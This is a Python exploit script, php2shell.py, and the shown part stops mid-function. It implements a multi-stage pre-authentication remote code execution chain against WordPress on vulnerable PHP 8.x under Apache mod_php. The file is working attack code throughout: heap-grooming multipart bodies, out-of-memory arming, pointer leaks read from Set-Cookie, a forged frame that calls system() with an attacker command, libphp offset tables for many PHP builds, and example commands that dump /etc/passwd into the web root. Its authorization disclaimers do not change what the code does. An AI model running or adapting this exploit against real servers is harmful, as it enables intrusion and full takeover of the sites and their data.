#!/usr/bin/env python3
"""
php2shell.py - full pre-auth RCE against an AUTHORIZED target running WordPress on
PHP 8.5.x x86_64, Apache/2.4.x prefork mod_php, stock config
(memory_limit=128M, post_max_size=8M - override the arming size with
--memory-limit). Pass the target with -u; there is no default - only run this
against systems you own or are explicitly permitted to test (see README and
CREDITS for authorization notes).

Version profiles: the entire vulnerable 8.5 series (8.5.0 - 8.5.11) is supported for this
chain; it was fixed in 8.5.12. The target's PHP version is auto-detected from
the X-Powered-By header; override with --version; if it is undetectable the
8.5.11 profile is assumed (the stage-1 heap leak is profile-independent;
stages 2-3 use its libphp offsets). Only the per-build libphp offsets (ZIF/DTOR)
differ between these versions - the stage-3 carrier geometry carries over
unchanged across all of them, and arming calibration (PADS) is set per-version
in PROFILES where a release shifted it (8.5.9). Every release was
behaviorally validated to RCE on replicas of its stock build (x86_64 + ASLR)
EXCEPT 8.5.3, which is stage-1 leak-only - see the PROFILES comment for the
fill-size scan data and what would be needed to close that gap.

IMPORTANT: the chain requires display_errors=On (or equivalent early output)
on the target. With display_errors=Off the arming request's own session cookie
is sent successfully and clears PS(send_cookie), which closes the Set-Cookie
leak channel for the follow-up - no leak, no RCE.

STRATEGY: KEEP-ALIVE ARM→FOLLOW-UP.
  Open ONE persistent HTTP/1.1 connection per stage; send the OOM arming over it
  (chunked TE, bypasses post_max_size); after the OOM response, send the follow-up
  on the SAME socket -> guaranteed same worker (prefork binds keep-alive conns to
  one child). The pinned worker is busy with our connection for the whole cycle, so
  wp-cron/bots cannot clear the armed state mid-cycle. No pinning infra, no spray.

  stage 1: arm _oom(b"x")      -> B-request same conn -> Set-Cookie chunk-base leak
  stage 2: arm _oom(b"x"*39)   -> B-request same conn -> libphp pointer (dtor gate)
  stage 3: arm pads=112        -> exploit same conn -> RCE at shutdown; proof =
                GET of the file the cmd redirects to, or (commands without an
                output redirect) the worker dying during the exploit POST

All POSTs go to the page named in -u (no hardcoded path). The proof file, when
the cmd has an output redirect, comes from the cmd itself: '-c "id>p"' creates
/p in the docroot (the worker cwd) and the tool GETs it to confirm RCE.
Without a redirect the exploit POST is the verification: the forged frame
kills the worker before or inside the final response flush, so RCE is
confirmed when the POST gets no response or a body truncated before its final
chunk (the worker died mid-request); a complete response means the frame was
not hit.

The request-body construction and the stage-3 forged-frame geometry are derived
from @alvarodh5's single-file php2shell PoC (MIT license), which builds on public
work by @9bie and @dinosn - see CREDITS.md. This file adds the stock-config
calibration (pads=112 for 128M memory_limit) and keep-alive live targeting. The
live run this was validated against is in evidence/ (target IP redacted); the
patched PHP 8.5.12 control shows no leak.

Commands:
  - any command up to 14 bytes runs on the original proven carrier geometry;
  - longer commands use an extended carrier with its own calibrated offset, and
    (when the cmd writes a proof file) a marker write is appended to the SAME
    proof file so success is provable black-box (GET of the proof file must
    return the marker).
  The cmd's output redirect names the proof file (e.g. 'id>p' -> /p,
  'cat /etc/passwd>>r' -> /r). If your docroot is not www-data-writable no file
  appears; fallbacks: read a /tmp variant via SSH, or use a short-URL callback.
  No NUL bytes in the command.

Usage:
  python3 php2shell.py --url https://<authorized-target>/index.php     # full chain (1+2+3)
  python3 php2shell.py -u ... --stage 1                                # heap leak only
  python3 php2shell.py -u ... --stage 2                                # + libphp leak
  python3 php2shell.py -u ... --cmd 'id>p'                             # custom command
  python3 php2shell.py -u ... --cmd 'id'                               # no redirect: worker-death proof
  python3 php2shell.py -u ... --memory-limit 100M                      # arming size for a 100M memory_limit
  python3 php2shell.py -u ... --version 8.5.10                         # pin a version profile
  python3 php2shell.py -u ... --no-color                               # plain output (disable colors)
"""
import argparse, re, select, socket, ssl, struct, sys, threading, time, urllib.parse
from collections import Counter

# --------------------------------------------------------------------------- constants
# No default target: pass -u explicitly (authorized targets only).
#
# Per-version profiles covering the entire vulnerable 8.5 series (fixed in
# 8.5.12). ZIF/DTOR are libphp.so offsets, nm-derived from the stock
# php:X.Y.Z-apache (Debian) image builds - zif_system is a local symbol there,
# so use full `nm`, not just `-D`. HTDATA* is identical across the whole series
# (the parser/allocator code that determines it never changed within 8.5.x).
#
# PADS calibration, interposer-measured on the .9/.10/.11 replicas: at pads=112
# the dangling reference sits at k=75 (≡5 mod 7 - dead) on .9 and at k=76
# (≡6 - aligned) only on .10/.11; a RINIT-time heap change in the .10 release
# shifted the OOM landing point by one bin-3 slot. PADS=114 restores alignment
# (k=83 ≡ 6). The same value was applied to .0–.8 on the basis of series-wide
# php-src tag diffs - and is now CONFIRMED behaviorally: see validation status.
#
# Validation status (2026-10-26): EVERY release in the vulnerable series was run
# against a replica of its stock build, x86_64 + ASLR - RCE cycle 1 on all of
# them, every stage on attempt 1, dtor gate passing throughout; this also
# validates the nm-derived ZIF offsets for .0–.8 against their real builds.
# Every version leaks the EXACT zval_ptr_dtor symbol in the stage-2 slot.
# (8.5.3 initially appeared to leak zptr+11 - that was a cookie-decoding
# artifact: its dtor offset ends in 0x20, which php_url_encode emits as '+',
# and parse_cookie used to leave '+' undecoded. Fixed; see parse_cookie.)
PROFILES = {
    # 8.5.X
    "8.5.11": {"ZIF": 0x00000000005996e0, "DTOR": 0x00000000007b47a0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.5.10": {"ZIF": 0x0000000000598d60, "DTOR": 0x00000000007b3860,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.5.9":  {"ZIF": 0x0000000000598160, "DTOR": 0x00000000007b29a0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.8":  {"ZIF": 0x0000000000596620, "DTOR": 0x00000000007b0d60,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.7":  {"ZIF": 0x00000000005960e0, "DTOR": 0x00000000007b0460,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.6":  {"ZIF": 0x0000000000595160, "DTOR": 0x00000000007ae6e0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.5":  {"ZIF": 0x0000000000570de0, "DTOR": 0x0000000000789ae0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.4":  {"ZIF": 0x00000000005705e0, "DTOR": 0x0000000000788ba0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.3":  {"ZIF": 0x000000000056d1e0, "DTOR": 0x0000000000785620,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.2":  {"ZIF": 0x000000000056bca0, "DTOR": 0x0000000000783de0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.1":  {"ZIF": 0x000000000056a9a0, "DTOR": 0x00000000007826a0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    "8.5.0":  {"ZIF": 0x000000000056a420, "DTOR": 0x0000000000781fe0,"HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 114},
    # 8.4.X
    "8.4.26": {"ZIF": 0x0000000000465370, "DTOR": 0x000000000065eb60, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.25": {"ZIF": 0x0000000000464c70, "DTOR": 0x000000000065dc60, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.24": {"ZIF": 0x0000000000464530, "DTOR": 0x000000000065d1e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.23": {"ZIF": 0x0000000000462d70, "DTOR": 0x000000000065b9a0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.22": {"ZIF": 0x0000000000462d30, "DTOR": 0x000000000065b9e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.21": {"ZIF": 0x00000000004623b0, "DTOR": 0x000000000065afe0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.20": {"ZIF": 0x0000000000447530, "DTOR": 0x000000000063f9e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.19": {"ZIF": 0x00000000004472f0, "DTOR": 0x000000000063efe0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.18": {"ZIF": 0x0000000000446ff0, "DTOR": 0x000000000063eb20, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.17": {"ZIF": 0x0000000000446cb0, "DTOR": 0x000000000063e520, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.16": {"ZIF": 0x0000000000446930, "DTOR": 0x000000000063de20, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.15": {"ZIF": 0x0000000000445f70, "DTOR": 0x000000000063d420, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.14": {"ZIF": 0x0000000000445c30, "DTOR": 0x000000000063d020, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.13": {"ZIF": 0x0000000000445bf0, "DTOR": 0x000000000063cbe0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.12": {"ZIF": 0x0000000000446cf0, "DTOR": 0x000000000063dc20, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.11": {"ZIF": 0x0000000000446cb0, "DTOR": 0x000000000063d2e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.10": {"ZIF": 0x000000000043b7d0, "DTOR": 0x000000000062cf70, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    # "8.4.9"
    "8.4.8":  {"ZIF": 0x000000000043b940, "DTOR": 0x000000000062cd10, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.7":  {"ZIF": 0x000000000043b920, "DTOR": 0x000000000062cd60, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.6":  {"ZIF": 0x000000000043b940, "DTOR": 0x000000000062ca40, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.5":  {"ZIF": 0x000000000043b660, "DTOR": 0x000000000062c420, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.4":  {"ZIF": 0x000000000043a650, "DTOR": 0x000000000062ac70, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.4.3":  {"ZIF": 0x0000000000439bb0, "DTOR": 0x0000000000629e20, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},

    # 8.3.X
    "8.3.9":  {"ZIF": 0x00000000003a03d0, "DTOR": 0x000000000048e3e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.8":  {"ZIF": 0x00000000003a0240, "DTOR": 0x000000000048dc80, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.7":  {"ZIF": 0x00000000003a01b0, "DTOR": 0x000000000048e0b0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.6":  {"ZIF": 0x00000000003a0050, "DTOR": 0x000000000048d9e0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.4":  {"ZIF": 0x00000000003a0040, "DTOR": 0x000000000048dda0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.35": {"ZIF": 0x00000000003ac080, "DTOR": 0x000000000049ec50, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.33": {"ZIF": 0x00000000003abf80, "DTOR": 0x000000000049e650, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.32": {"ZIF": 0x00000000003abe80, "DTOR": 0x000000000049e550, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.31": {"ZIF": 0x00000000003abe80, "DTOR": 0x000000000049e550, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.30": {"ZIF": 0x00000000003abc40, "DTOR": 0x000000000049dcd0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.3":  {"ZIF": 0x00000000003a0090, "DTOR": 0x000000000048d8c0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.29": {"ZIF": 0x00000000003abdc0, "DTOR": 0x000000000049db50, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.28": {"ZIF": 0x00000000003ab8c0, "DTOR": 0x000000000049d790, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.27": {"ZIF": 0x00000000003ab680, "DTOR": 0x000000000049d510, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.26": {"ZIF": 0x00000000003ab700, "DTOR": 0x000000000049d290, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.25": {"ZIF": 0x00000000003ab3c0, "DTOR": 0x000000000049ce10, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.24": {"ZIF": 0x00000000003ab340, "DTOR": 0x000000000049ccd0, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
    "8.3.23": {"ZIF": 0x00000000003a1f40, "DTOR": 0x0000000000491690, "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},
}
# Active profile (set by select_profile() in main; defaults to 8.5.11 so the
# stage functions remain usable standalone as before).
ZIF, DTOR = PROFILES["8.5.11"]["ZIF"], PROFILES["8.5.11"]["DTOR"]
HTDATA    = PROFILES["8.5.11"]["HTDATA"]          # 167B data / 192B block (lab-calibrated)
HTDATA_EXT= PROFILES["8.5.11"]["HTDATA_EXT"]      # extended-carrier offset (interposer-measured)
PADS      = PROFILES["8.5.11"]["PADS"]            # stock calibration: ref slot k=76 (k ≡ 6 mod 7)
EXT_LEN   = 479                  # extended carrier data length -> 504B block (version-independent)
MEM_LIMIT_MB = 140.0           # arming multipart size (MB) - set by --memory-limit; keep it above the target's memory_limit (128M stock), OOM lands at the 128MB mark
CMD_CAP_SHORT = 14               # cmd bytes that fit the original carrier
EXT_CMD_SPACE = EXT_LEN - 0x98 - 1   # cmd bytes available in the extended carrier (=326)

SID = b"attacksessionid0001"     # attacker-chosen session id (from @alvarodh5's PoC)

# --------------------------------------------------------------------------- layout note
# The stage bodies' numeric field names register as INTEGER hash keys (zero string
# allocations); random alphanumeric names become string keys - hundreds of extra
# zend_string allocations that shift the calibrated block-reuse pattern and kill
# the leak. Part counts/sizes/names are fixed - do not "fix" them. The boundary
# LENGTH is layout-relevant (parser buffers size to it); the boundary CONTENT is
# not.
TLS = False   # set by main() from the -u URL scheme (https:// -> TLS)

def _connect(host, port, timeout):
    """TCP connect + optional TLS wrap. Cert verification is OFF by default:
    lab replicas use self-signed certs and this tool is black-box; verify
    out-of-band when it matters. SNI is set so vhost-based targets work."""
    s = socket.create_connection((host, port), timeout=timeout)
    if TLS:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError: pass
    return s

def _host_header(host, port):
    return host if port in (80, 443) else f"{host}:{port}"

def _boundary(default):
    """Boundary shared by the Content-Type header and the multipart body. The
    LENGTH is layout-relevant (parser buffers size to it); the content is not."""
    return default

def _request_headers(host, port, path, boundary, body_len=None, chunked=False):
    """Request head bytes for KA.send_request. `path` is the user-supplied target
    page (from -u) - never hardcoded."""
    ct = f"multipart/form-data; boundary={boundary.decode()}"
    te_cl = "Transfer-Encoding: chunked" if chunked else f"Content-Length: {body_len}"
    h = [f"Host: {_host_header(host, port)}", f"Content-Type: {ct}", te_cl,
         "Connection: keep-alive"]
    return (f"POST {path} HTTP/1.1\r\n" + "\r\n".join(h) + "\r\n\r\n").encode()

def select_profile(version):
    """Load a version profile into the active globals. Raises KeyError if unknown."""
    global ZIF, DTOR, HTDATA, HTDATA_EXT, PADS
    p = PROFILES[version]
    ZIF, DTOR = p["ZIF"], p["DTOR"]
    HTDATA, HTDATA_EXT, PADS = p["HTDATA"], p["HTDATA_EXT"], p["PADS"]

def detect_php_version(host, port):
    """Read the exact PHP version from X-Powered-By on GET /
    (mod_php exposes it by default; exposed_php_version=Off hides it)."""
    s = _connect(host, port, 20)
    try:
        s.sendall(_get_head(host, port, "/"))
        data = b""
        while True:
            c = s.recv(65536)
            if not c: break
            data += c
    finally:
        s.close()
    head, _, _ = data.partition(b"\r\n\r\n")
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"x-powered-by:"):
            m = re.search(rb"PHP/(\d+\.\d+\.\d+)", line)
            if m: return m.group(1).decode()
    return None

COLOR = False   # set by main() from --color/--no-color (auto: on when stdout is a TTY)

# ANSI SGR codes (applied only while COLOR is on)
BOLD, DIM = 1, 2
RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN = 31, 32, 33, 34, 35, 36

def c(s, *codes):
    """Wrap s in ANSI SGR codes (no-op while COLOR is off)."""
    if not COLOR or not codes:
        return str(s)
    return "\033[" + ";".join(str(x) for x in codes) + "m" + str(s) + "\033[0m"

def hexdump(data, title=None, max_bytes=None):
    """Classic 16-per-line hex + ASCII dump, routed through log()."""
    if title is not None:
        log(c(f"---- {title} ({len(data)} bytes) ----", CYAN, BOLD))
    limit = len(data) if max_bytes is None else min(max_bytes, len(data))
    off = 0
    while off < limit:
        chunk = data[off:off + 16]
        hx = " ".join(f"{b:02x}" for b in chunk).ljust(47)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        log(f"  {c(f'{off:08x}', DIM)}  {hx}  |{c(asc, CYAN)}|")
        off += 16
    if max_bytes is not None and len(data) > max_bytes:
        log(c(f"  ... {len(data) - max_bytes} more bytes ...", DIM))

def log(msg):
    line = time.strftime("[%Y-%m-%d %H:%M:%S] ") + str(msg)
    print(line, flush=True)

def dump_head(head, request=True):
    """Dump an HTTP head (the request template or the response) line by line in
    DIM (gray), with the critical headers highlighted: in the request the
    framing headers (Content-Type/boundary, Content-Length, Transfer-Encoding);
    in the response Set-Cookie (the leak channel) plus the framing headers."""
    if isinstance(head, (bytes, bytearray)):
        head = bytes(head).decode("latin1")
    hl = (("content-type", "content-length", "transfer-encoding") if request
          else ("set-cookie", "content-length", "transfer-encoding", "connection"))
    for line in head.splitlines():
        if not line:
            continue
        low = line.lower()
        if low.startswith("set-cookie:"):
            log("    " + c(line, GREEN, BOLD))
        elif any(low.startswith(k + ":") for k in hl):
            log("    " + c(line, BOLD, YELLOW))
        else:
            log("    " + c(line, DIM))

def _resp_head(resp):
    """HTTP head (everything before the blank line) of a raw response; b'' when
    the response was empty."""
    if not resp:
        return b""
    head, _, _ = resp.partition(b"\r\n\r\n")
    return head

def _parse_size_mb(s):
    """Parse a human size for --memory-limit ('100M', '140MB', '512K', '1.5G';
    a bare number is MB) into MB."""
    m = re.fullmatch(r"\s*(\d+(?:\.\d+)?)\s*([kKmMgG]?[bB]?)\s*", s)
    if not m:
        raise argparse.ArgumentTypeError(f"bad size {s!r} (e.g. 100M, 512K, 1.5G)")
    return float(m.group(1)) * {"k": 1 / 1024, "m": 1.0, "g": 1024.0}[(m.group(2)[:1] or "m").lower()]

STATS = {}   # filled by the stage runners: stage name -> (ok, detail)

def stat_record(stage, ok, detail):
    STATS[stage] = (bool(ok), detail)

def print_summary(ok, verdict):
    log("")
    log(c("=== RUN SUMMARY ===", CYAN, BOLD))
    for s in ("stage1", "stage2", "stage3"):
        if s not in STATS:
            continue
        sok, detail = STATS[s]
        mark = c("OK  ", GREEN, BOLD) if sok else c("FAIL", RED, BOLD)
        log(f"  {s:<7}{mark}  {detail}")
    done = sum(1 for v in STATS.values() if v[0])
    log(f"  stages: {done}/{len(STATS)} succeeded")
    log(c("VERDICT: ", BOLD) + c(verdict, GREEN if ok else RED, BOLD))

# ------------------------------------------------------------------ body primitives
# (multipart encoder / cookie parser / part builders derived from @alvarodh5's PoC)
def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n" + b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"\r\nContent-Type: application/octet-stream'
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    return bytes(out + b"--" + boundary + b"--\r\n")

def parse_cookie(resp):
    # Space-safe decode. php_url_encode_impl (ext/standard/url.c, raw=false)
    # form-encodes the leaked bytes: 0x20 becomes a literal '+' while every
    # other non-alnum byte becomes %XX - so a '+' in the cookie can ONLY come
    # from an original space. unquote_to_bytes alone leaves '+' as 0x2B, which
    # silently corrupted any leak whose pointer low byte is 0x20 (this bit
    # 8.5.3: zval_ptr_dtor sits at libphp+0x785620 there; the mis-decoded
    # "zptr+11" was our bug, not a PHP anomaly). Decode '+' -> space first.
    # The value is captured up to the FIRST ';' or end-of-line: it no longer
    # requires the literal '; path=/' suffix, so custom session.cookie_path
    # values and proxy-rewritten attribute sets still parse (a missing/changed
    # 'path=' used to silently read as "no leak").
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^;\r\n]*)", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1").replace("+", "%20"))

def file_part():   # small real upload (part of the arming shape)
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def big_part(mb):  # single field > memory_limit -> OOM during parsing
    return {"name": "big", "data": b"B" * int(round(mb * 1024 * 1024))}

# ------------------------------------------------- stage-3 forged frame geometry
# (from @alvarodh5's PoC; offsets are for PHP 8.5.11 x86_64, stock image build)
def forged_carrier(ht_abs, zif_abs, cmd, size):
    """Carrier: forged HashTable + execute_data frame + command string.
    All forged structures occupy offsets < 0x98; the command region starts at
    0x98. size=167 is the original proven geometry (<= 14-byte commands);
    size=EXT_LEN extends the command region for longer commands."""
    cmd = cmd.encode(); ht = bytearray(size)
    struct.pack_into("<II", ht, 0, 1, 7)                 # gc: refcount=1, IS_ARRAY
    struct.pack_into("<II", ht, 8, 0x10, 0xFFFFFFF8)     # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, ht_abs + 0x20)      # arData -> execute_data
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed / nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0); struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_abs)            # pDestructor = zif_system
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x10, zif_abs)
    struct.pack_into("<I", ht, E + 0x2C, 1)              # ZEND_CALL_NUM_ARGS = 1
    struct.pack_into("<Q", ht, E + 0x50, ht_abs + 0x80)  # arg1 value -> fake zend_string
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 type = IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106); struct.pack_into("<Q", ht, 0x90, len(cmd))
    if len(cmd) > size - 0x98 - 1:
        raise ValueError(f"cmd {len(cmd)}B does not fit a {size}B carrier")
    ht[0x98:0x98 + len(cmd)] = cmd; ht[0x98 + len(cmd)] = 0
    return bytes(ht)

def live_ref(ht_abs):
    """31-byte blob that reclaims the dangling PS(http_session_vars) slot and
    points it at the carrier (ht_abs)."""
    v = bytearray(b"R" * 31); struct.pack_into("<Q", v, 0, (10 << 32) | 1)
    struct.pack_into("<Q", v, 8, ht_abs); struct.pack_into("<I", v, 0x10, 0x307)
    struct.pack_into("<I", v, 0x14, 0); return bytes(v)

# --------------------------------------------------------------------------- KA
class KA:
    """Persistent-connection multipart POSTer. Chunked arming stops sending the
    moment the first response byte arrives (avoids post-OOM desync); responses are
    fully drained so the socket stays in sync for the next request. A single reader
    thread owns ALL socket reads while the main thread only sends and checks
    len(data) - that split keeps the original zero-stall send speed AND removes the
    old bug, where a second recv() on the same socket (the post-join drain) could
    race the reader's and lose bytes of a slow response. `path` is the user-supplied
    target page (from -u) that every POST on this connection hits."""
    def __init__(self, host, port, path, timeout=900):
        self.host, self.port, self.path = host, port, path
        # TLS note: the reader thread is the ONLY caller of select()/recv() on this
        # socket; the main thread only sendall()s. One read owner per socket is what
        # makes this race-free on SSLSocket in CPython 3.7+.
        self.s = _connect(host, port, timeout)
    def send_request(self, body, boundary, chunked=False, read_cap=9 << 20):
        hdr = _request_headers(self.host, self.port, self.path, boundary,
                               body_len=len(body), chunked=chunked)
        data = bytearray()   # reader-owned; main only checks len() (GIL-atomic)

        def reader():
            try:
                while len(data) < read_cap:
                    r, _, _ = select.select([self.s], [], [], 2.0)
                    if not r: break          # 2 s of silence = response complete
                    c = self.s.recv(65536)
                    if not c: break
                    data.extend(c)
            except (socket.timeout, OSError):
                pass

        th = threading.Thread(target=reader, daemon=True); th.start()
        try:
            # Short socket timeout bounds the reader's recv (incl. SSL-layer edge
            # cases) and any sendall against a stalled peer; select carries its own 2 s cap.
            self.s.settimeout(5.0)
            self.s.sendall(hdr)
            sent_mb = 0.0
            if chunked:
                mv = memoryview(body); CH = 262144
                for o in range(0, len(mv), CH):
                    c = bytes(mv[o:o+CH])
                    self.s.sendall(b"%x\r\n" % len(c)); self.s.sendall(c); self.s.sendall(b"\r\n")
                    sent_mb += len(c) / 1e6
                    if data:   # response already arriving (OOM) -> stop, keep conn in sync
                        log(f"[ka] arming: response arrived at {sent_mb:.0f}MB sent; stopping upload")
                        break
                else:
                    self.s.sendall(b"0\r\n\r\n")
            else:
                self.s.sendall(body)
        except (socket.timeout, OSError):
            pass   # connection trouble mid-flight; return whatever we have
        finally:
            self.s.settimeout(900)
        th.join(timeout=30)   # reader finishes within ~2 s of the last byte (+5 s SSL bound)
        if not data: return "<no response>", b""
        head, _, _ = bytes(data).partition(b"\r\n\r\n")
        status = head.split(b"\r\n")[0].decode("latin1", "replace")
        return status, bytes(data)

# ------------------------------------------------------------------ arming bodies
# Body builders take an explicit boundary: the Content-Type header and the body
# MUST agree (a mismatch makes the parser find no parts - arming silently does
# nothing). Call sites pass _boundary(...) so header and body always match.
def arm_body(kind, boundary=None):
    if kind == "x":
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x"} for i in range(1001)]
    elif kind == "x39":
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    else:
        parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}]
        for i in range(PADS):
            parts.append({"name": (f"p{i:06d}")[:7], "data": b"V" * 1})
    if kind != "pads":
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, file_part(), big_part(MEM_LIMIT_MB)]
    else:
        parts += [file_part(), big_part(MEM_LIMIT_MB)]
    return multipart(parts, boundary or b"S" * 17)

# NOTE: field names in these bodies are FIXED (numeric names register as integer
# hash keys - zero string allocations; string names would perturb the calibrated
# block-reuse pattern and kill the leak).
def stage1_body(boundary=None):
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(841): parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return multipart(parts, boundary or b"B" * 10)

def stage2_body(boundary=None):
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        for j in range(16 if i == 406 else 1): parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    return multipart(parts, boundary or b"B" * 10)

def stage3_body(ht_abs, zif_abs, cmd, extended=False, boundary=None):
    size = EXT_LEN if extended else 167
    ht = forged_carrier(ht_abs, zif_abs, cmd, size); live = live_ref(ht_abs)
    parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
    for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
    for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
    parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
    return multipart(parts, boundary or b"B" * 10)

# ------------------------------------------------------------------ plain GET
def _get_head(host, port, path):
    """GET request head. _host_header() strips :80/:443 - WordPress' canonical
    redirect (X-Redirect-By: WordPress) 301s requests whose Host header doesn't
    match siteurl, and "ip:80" != "http://ip"."""
    return f"GET {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\nConnection: close\r\n\r\n".encode()

def http_get(host, port, path, timeout=20):
